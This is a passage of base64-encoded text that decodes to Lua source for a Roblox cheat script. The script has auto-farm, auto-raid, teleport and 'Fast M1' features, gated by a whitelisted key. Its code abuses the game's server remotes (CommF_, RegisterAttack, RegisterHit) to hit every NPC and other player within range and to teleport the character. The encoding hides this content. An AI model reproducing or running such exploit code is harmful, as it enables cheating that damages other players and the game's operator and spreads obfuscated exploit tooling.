CAgICAgICAgICAgICAgICAgIGxvY2FsIGFsbFRhcmdldHMgPSB7fQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdGFyZ2V0Q2hhciBpbiBwYWlycyh0YXJnZXRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGVhZCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9yc28gPSB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpIG9yIHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIlVwcGVyVG9yc28iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHJwID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBoZWFkIHRoZW4gdGFibGUuaW5zZXJ0KGFsbFRhcmdldHMsIHt0YXJnZXRDaGFyLCBoZWFkfSkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3JzbyBhbmQgdG9yc28gfj0gaGVhZCB0aGVuIHRhYmxlLmluc2VydChhbGxUYXJnZXRzLCB7dGFyZ2V0Q2hhciwgdG9yc299KSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhycCBhbmQgaHJwIH49IGhlYWQgYW5kIGhycCB+PSB0b3JzbyB0aGVuIHRhYmxlLmluc2VydChhbGxUYXJnZXRzLCB7dGFyZ2V0Q2hhciwgaHJwfSkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiAjYWxsVGFyZ2V0cyA9PSAwIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDMgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZ2lzdGVyQXR0YWNrOkZpcmVTZXJ2ZXIoMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZ2lzdGVySGl0OkZpcmVTZXJ2ZXIoYWxsVGFyZ2V0c1sxXVsyXSwgYWxsVGFyZ2V0cykKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICB3aGlsZSBDb25maWcuRmFzdE0xIGFuZCBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlDaGFyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG15SFJQID0gbXlDaGFyIGFuZCBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIG15SFJQIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0c0luUmFuZ2UgPSB7fQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBlbmVtaWVzRm9sZGVyID0gd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJFbmVtaWVzIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZW5lbWllc0ZvbGRlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgbnBjIGluIHBhaXJzKGVuZW1pZXNGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IG5wYzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGhycCA9IG5wYzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgYW5kIGhycCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChocnAuUG9zaXRpb24gLSBteUhSUC5Qb3NpdGlvbikuTWFnbml0dWRlIDw9IDUwMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHRhcmdldHNJblJhbmdlLCBucGMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gcC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgYW5kIGhycCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChocnAuUG9zaXRpb24gLSBteUhSUC5Qb3NpdGlvbikuTWFnbml0dWRlIDw9IDUwMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHRhcmdldHNJblJhbmdlLCBwLkNoYXJhY3RlcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiAjdGFyZ2V0c0luUmFuZ2UgPiAwIHRoZW4gQXR0YWNrTXVsdGlwbGVUYXJnZXRzKHRhcmdldHNJblJhbmdlKSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLkZhc3RNMSBhbmQgRmFzdE0xQnRuIHRoZW4KICAgICAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dCA9ICJPcCBGYXN0IE0xIiAuLiAoQ29uZmlnLklzV2hpdGVsaXN0ZWQgYW5kICIiIG9yICIg8J+UkiIpCiAgICAgICAgICAgICAgICAgICAgRmFzdE0xQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKCiAgICAgICAgRmFzdE0xQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgQ29uZmlnLklzV2hpdGVsaXN0ZWQgdGhlbiBTZW5kTm90aWZpY2F0aW9uKCJZb3VyIGtleSBpcyBub3Qgd2hpdGVsaXN0ZWQsIHlvdSBjYW5ub3QgdXNlIHRoaXMgb3B0aW9uIiwgMykgcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgQ29uZmlnLkZhc3RNMSA9IG5vdCBDb25maWcuRmFzdE0xCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBDb25maWcuRmFzdE0xIHRoZW4KICAgICAgICAgICAgICAgIEZhc3RNMUJ0bi5UZXh0ID0gIlNUT1AgRkFTVCBNMSIKICAgICAgICAgICAgICAgIEZhc3RNMUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgICAgICAgICBTdGFydEZhc3RNMSgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIEZhc3RNMUJ0bi5UZXh0ID0gIk9wIEZhc3QgTTEiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICAgICAgICAgIEZhc3RNMUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgLS0gSG9vayBGYXJtIFRvZ2dsZXMgdG8gRmFzdCBNMQogICAgbG9jYWwgZnVuY3Rpb24gVXBkYXRlRmFzdE0xU3RhdGUoKQogICAgICAgIGxvY2FsIHNob3VsZEJlT24gPSBDb25maWcuQ3VzdG9tRmFybU5lYXJlc3Qgb3IgQ29uZmlnLk1hc3RlcnlGYXJtIG9yIENvbmZpZy5BdXRvRWxpdGVodW50ZXIKICAgICAgICBpZiBzaG91bGRCZU9uIGFuZCBub3QgQ29uZmlnLkZhc3RNMSB0aGVuCiAgICAgICAgICAgIENvbmZpZy5GYXN0TTEgPSB0cnVlCiAgICAgICAgICAgIGlmIEZhc3RNMUJ0biB0aGVuCiAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dCA9ICJTVE9QIEZBU1QgTTEiCiAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgU3RhcnRGYXN0TTEgdGhlbiBTdGFydEZhc3RNMSgpIGVuZAogICAgICAgIGVsc2VpZiBub3Qgc2hvdWxkQmVPbiBhbmQgQ29uZmlnLkZhc3RNMSB0aGVuCiAgICAgICAgICAgICBDb25maWcuRmFzdE0xID0gZmFsc2UKICAgICAgICAgICAgIGlmIEZhc3RNMUJ0biB0aGVuCiAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dCA9ICJPcCBGYXN0IE0xIiAuLiAoQ29uZmlnLklzV2hpdGVsaXN0ZWQgYW5kICIiIG9yICIg8J+UkiIpCiAgICAgICAgICAgICAgICBGYXN0TTFCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkN1c3RvbUZhcm1OZWFyZXN0Il0gdGhlbiBUb2dnbGVCdXR0b25zWyJDdXN0b21GYXJtTmVhcmVzdCJdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoVXBkYXRlRmFzdE0xU3RhdGUpIGVuZAogICAgaWYgVG9nZ2xlQnV0dG9uc1siTWFzdGVyeUZhcm0iXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIk1hc3RlcnlGYXJtIl0uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChVcGRhdGVGYXN0TTFTdGF0ZSkgZW5kCiAgICBpZiBUb2dnbGVCdXR0b25zWyJBdXRvRWxpdGVodW50ZXIiXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIkF1dG9FbGl0ZWh1bnRlciJdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoVXBkYXRlRmFzdE0xU3RhdGUpIGVuZAoKICAgIC0tIFNlYSBUZWxlcG9ydCBCdXR0b25zIChubyBjYXRlZ29yeSkKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVRlbGVwb3J0QnRuKHRleHQsIHJlbW90ZUFyZywgb3JkZXIpCiAgICAgICAgbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgYnRuLlRleHQgPSB0ZXh0CiAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIGJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBidG4uVGV4dFNpemUgPSAxMAogICAgICAgIGJ0bi5MYXlvdXRPcmRlciA9IG9yZGVyCiAgICAgICAgYnRuLlBhcmVudCA9IFBhZ2VzLlRlbGVwb3J0CiAgICAgICAgbG9jYWwgYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkgYy5QYXJlbnQgPSBidG4KICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkNvbW1GXzpJbnZva2VTZXJ2ZXIocmVtb3RlQXJnKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuVGVsZXBvcnQsICJTZWEiLCAxKQoKICAgIGNyZWF0ZVRlbGVwb3J0QnRuKCJTZWEgMSIsICJUcmF2ZWxNYWluIiwgMikKICAgIGNyZWF0ZVRlbGVwb3J0QnRuKCJTZWEgMiIsICJUcmF2ZWxEcmVzc3Jvc2EiLCAzKQogICAgY3JlYXRlVGVsZXBvcnRCdG4oIlNlYSAzIiwgIlRyYXZlbFpvdSIsIDQpCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiUGxheWVyIFN0YXRzIiwgMjUpCgogICAgLS0gUmFpZCBQYWdlIENvbnRlbnQgKER1bmdlb24pCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlJhaWQsICJBdXRvIFJhaWQiLCAxKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlJhaWQsICJFbmFibGUgQXV0byBSYWlkIiwgIkF1dG9SYWlkIiwgMikKICAgIGNyZWF0ZUtleWJpbmQoUGFnZXMuUmFpZCwgIkF1dG8gUmFpZCBLZXkiLCAiQXV0b1JhaWRLZXkiLCAzKQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlJhaWQsICJDaGlwIEJ1eWVyIiwgNCkKICAgIGNyZWF0ZUN5Y2xlKFBhZ2VzLlJhaWQsICJTZWxlY3QgUmFpZCIsICJTZWxlY3RlZFJhaWQiLCB7IkZsYW1lIiwgIkljZSIsICJRdWFrZSIsICJMaWdodCIsICJEYXJrIiwgIlNwaWRlciIsICJSdW1ibGUiLCAiTWFnbWEiLCAiQnVkZGhhIiwgIlNhbmQifSwgNSkKICAgIAogICAgZG8KICAgIGxvY2FsIEJ1eUNoaXBCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgQnV5Q2hpcEJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDI1KQogICAgQnV5Q2hpcEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgIEJ1eUNoaXBCdG4uVGV4dCA9ICJBdXRvIEJ1eSBDaGlwIChTY2llbnRpc3QpIgogICAgQnV5Q2hpcEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgIEJ1eUNoaXBCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBCdXlDaGlwQnRuLlRleHRTaXplID0gOQogICAgQnV5Q2hpcEJ0bi5MYXlvdXRPcmRlciA9IDYKICAgIEJ1eUNoaXBCdG4uUGFyZW50ID0gUGFnZXMuUmFpZAogICAgbG9jYWwgQkNfQyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBCQ19DLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkgQkNfQy5QYXJlbnQgPSBCdXlDaGlwQnRuCiAgICAKICAgIEJ1eUNoaXBCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgc2NpZW50aXN0ID0gbmlsCiAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIk15c3RlcmlvdXMgU2NpZW50aXN0IiBhbmQgdjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICBzY2llbnRpc3QgPSB2CiAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGlmIHNjaWVudGlzdCBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSBzY2llbnRpc3QuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsMCwzKQogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJSYWlkc05wYyIsICJTZWxlY3QiLCBDb25maWcuU2VsZWN0ZWRSYWlkKQogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJSYWlkc05wYyIsICJCdXkiKQogICAgICAgIGVuZAogICAgZW5kKQogICAgZW5kCiAgICAKICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkF1dG9SYWlkIl0gdGhlbgogICAgICAgIFRvZ2dsZUJ1dHRvbnNbIkF1dG9SYWlkIl0uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIENvbmZpZy5BdXRvUmFpZCB0aGVuCiAgICAgICAgICAgICAgICBDb25maWcuQW50aUxhdmEgPSB0cnVlCiAgICAgICAgICAgICAgICBpZiBUb2dnbGVCdXR0b25zWyJBbnRpTGF2YSJdIHRoZW4gVG9nZ2xlQnV0dG9uc1siQW50aUxhdmEiXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSBGYXJtIFBhZ2UgQ29udGVudCAoU2VsZWN0ZWQgRmFybSBTY3JpcHQpCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLkZhcm0sICJTZWxlY3RlZCBGYXJtIiwgNSkKICAgIGRvCiAgICBsb2NhbCBMYXVuY2hGYXJtQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIExhdW5jaEZhcm1CdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIExhdW5jaEZhcm1CdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICBMYXVuY2hGYXJtQnRuLlRleHQgPSAiTEFVTkNIIEFEVkFOQ0VEIEZBUk0gVUkiCiAgICBMYXVuY2hGYXJtQnRuLlRleHRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgTGF1bmNoRmFybUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIExhdW5jaEZhcm1CdG4uVGV4dFNpemUgPSAxMAogICAgTGF1bmNoRmFybUJ0bi5MYXlvdXRPcmRlciA9IDYKICAgIExhdW5jaEZhcm1CdG4uUGFyZW50ID0gUGFnZXMuRmFybQogICAgbG9jYWwgTEZfQyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBMRl9DLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsNCkgTEZfQy5QYXJlbnQgPSBMYXVuY2hGYXJtQnRuCiAgICAKICAgIExhdW5jaEZhcm1CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgLS0gUFJPVklERUQgU0NSSVBUIExPR0lDCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgICAgICBsb2NhbCBUd2VlblNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCiAgICAgICAgICAgIGxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgICAgICAgICBsb2NhbCBWaXJ0dWFsSW5wdXRNYW5hZ2VyID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKICAgICAgICAgICAgbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCgogICAgICAgICAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgbG9jYWwgUGxheWVyR3VpID0gTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQoKICAgICAgICAgICAgX0cuQXV0b0Zhcm0gPSBmYWxzZQogICAgICAgICAgICBfRy5DdXJyZW50UXVlc3REYXRhID0gbmlsCiAgICAgICAgICAgIGxvY2FsIEdhbGF4eUh1Ykd1aSA9IG5pbAogICAgICAgICAgICBsb2NhbCBTdG9wQWxsS2V5ID0gbmlsCgogICAgICAgICAgICBsb2NhbCBHYW1lRGF0YSA9IHsKICAgICAgICAgICAgICAgIFsiU0VBIDEiXSA9IHsKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiU3RhcnRlciBJc2xhbmQiLCBFbW9qaSA9ICLwn4+BIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMzUsIDIwNiwgMjM1KSwgTW9icyA9IHsge0xldmVsID0gNSwgTW9iID0gIkJhbmRpdCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoMTA2MC44OSwgMTYuNzAsIDE1NTEuMjApLCBTcGF3biA9IFZlY3RvcjMubmV3KDEwODQuMDIsIDE2LjYxLCAxNTE5LjM1KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJKdW5nbGUiLCBFbW9qaSA9ICLwn4y0IiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNCwgMTM5LCAzNCksIE1vYnMgPSB7IHtMZXZlbCA9IDE0LCBNb2IgPSAiTW9ua2V5IiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTYwMC4xNCwgMzcuMTksIDE1MS45MCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTE2MDAuMTQsIDM3LjE5LCAxNTEuOTApfSwge0xldmVsID0gMjAsIE1vYiA9ICJHb3JpbGxhIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTYwMC4xNCwgMzcuMTksIDE1MS45MCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTExOTQuNjksIDguMTEsIC00NTAuMTcpfSwge0xldmVsID0gMjUsIE1vYiA9ICJUaGUgR29yaWxsYSBLaW5nIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTYwMC4xNCwgMzcuMTksIDE1MS45MCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTExOTQuNjksIDguMTEsIC00NTAuMTcpfSB9IH0sCiAgICAgICAgICAgICAgICAgICAgeyBOYW1lID0gIlBpcmF0ZSBWaWxsYWdlIiwgRW1vamkgPSAi8J+P" .. "tOKAjeKYoO+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMTYwLCA4MiwgNDUpLCBNb2JzID0geyB7TGV2ZWwgPSAzNSwgTW9iID0gIlBpcmF0ZSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTExNDEuMTcsIDUuMDksIDM4MjkuNDEpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xMTAzLjI4LCAxNi4yOSwgMzk0OC45NSl9LCB7TGV2ZWwgPSA0NSwgTW9iID0gIkJydXRlIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtMTE0MS4xNywgNS4wOSwgMzgyOS40MSksIFNwYXduID0gVmVjdG9yMy5uZXcoLTExNDcuNDEsIDE1LjE1LCA0MzExLjk5KX0sIHtMZXZlbCA9IDU1LCBNb2IgPSAiQ2hlZiIsIEdpdmVyID0gVmVjdG9yMy5uZXcoLTExNDEuMTcsIDUuMDksIDM4MjkuNDEpLCBTcGF3biA9IFZlY3RvcjMubmV3KC0xMTQ3LjQxLCAxNS4xNSwgNDMxMS45OSl9IH0gfSwKICAgICAgICAgICAgICAgICAgICB7IE5hbWUgPSAiRGVzZXJ0IiwgRW1vamkgPSAi8J+PnO+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjEwLCAxODAsIDE0MCksIE1vYnMgPSB7IHtMZXZlbCA9IDYwLCBNb2IgPSAiRGVzZXJ0IEJhbmRpdCIsIEdpdmVyID0gVmVjdG9yMy5uZXcoODk0Ljk4LCA2Ljc4LCA0MzkwLjcwKSwgU3Bhd24gPSBWZWN0b3IzLm5ldyg5MjUuNzAsIDYuNzksIDQ0ODIuNjYpfSwge0xldmVsID0gNzAsIE1vYiA9ICJEZXNlcnQgT2ZmaWNlciIsIEdpdmVyID0gVmVjdG9yMy5uZXcoODk0Ljk4LCA2Ljc4LCA0MzkwLjcwKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxNjA0LjQwLCAxLjk1LCA0MzcxLjA4KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJGcm96ZW4gVmlsbGFnZSIsIEVtb2ppID0gIuKdhO+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMTc2LCAyMjQsIDIzMCksIE1vYnMgPSB7IHtMZXZlbCA9IDkwLCBNb2IgPSAiU25vdyBCYW5kaXQiLCBHaXZlciA9IFZlY3RvcjMubmV3KDEzODYuNDgsIDg3LjYxLCAtMTI5Ni45NCksIFNwYXduID0gVmVjdG9yMy5uZXcoMTI2My4yOCwgMTA2LjEyLCAtMTQ0MS4wMil9LCB7TGV2ZWwgPSAxMDAsIE1vYiA9ICJTbm93bWFuIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygxMzg2LjQ4LCA4Ny42MSwgLTEyOTYuOTQpLCBTcGF3biA9IFZlY3RvcjMubmV3KDEyNjMuMjgsIDEwNi4xMiwgLTE0NDEuMDIpfSwge0xldmVsID0gMTEwLCBNb2IgPSAiWWV0aSIsIEdpdmVyID0gVmVjdG9yMy5uZXcoMTM4Ni40OCwgODcuNjEsIC0xMjk2Ljk0KSwgU3Bhd24gPSBWZWN0b3IzLm5ldygxMjYzLjI4LCAxMDYuMTIsIC0xNDQxLjAyKX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJNYXJpbmUgRm9ydHJlc3MiLCBFbW9qaSA9ICLwn4+wIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig3MCwgMTMwLCAxODApLCBNb2JzID0geyB7TGV2ZWwgPSAxMjAsIE1vYiA9ICJDaGllZiBQZXR0eSBPZmZpY2VyIiwgR2l2ZXIgPSBWZWN0b3IzLm5ldygtNTAzOC4zMSwgMjguOTksIDQzMjMuNjQpLCBTcGF3biA9IFZlY3RvcjMubmV3KC00OTkzLjg0LCAyMC45OSwgNDA0OC42OCl9LCB7TGV2ZWwgPSAxMzAsIE1vYiA9ICJWaWNlIEFkbWlyYWwiLCBHaXZlciA9IFZlY3RvcjMubmV3KC01MDM4LjMxLCAyOC45OSwgNDMyMy42NCksIFNwYXduID0gVmVjdG9yMy5uZXcoLTQ3MzYuNDYsIDIwLjk5LCA0NTYwLjA2KX0gfSB9LAogICAgICAgICAgICAgICAgICAgIHsgTmFtZSA9ICJTa3lsYW5kcyIsIEVtb2ppID0gIuKYge+4jyIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjQwLCAyNDgsIDI1NSksIE1vYnMgPSB7IHtMZXZlbCA9IDE1MCwgTW9iID0gIlNreSBCYW5kaXQiLCBHaXZlciA9IFZlY3RvcjMubmV3KC00ODM5LjU1LCA3MTguMDEsIC0yNjIyLjExKSwgU3Bhd24gPSBWZWN0b3IzLm5ldygtNTAzMi44NiwgMjc4LjQxLCAtMjgzN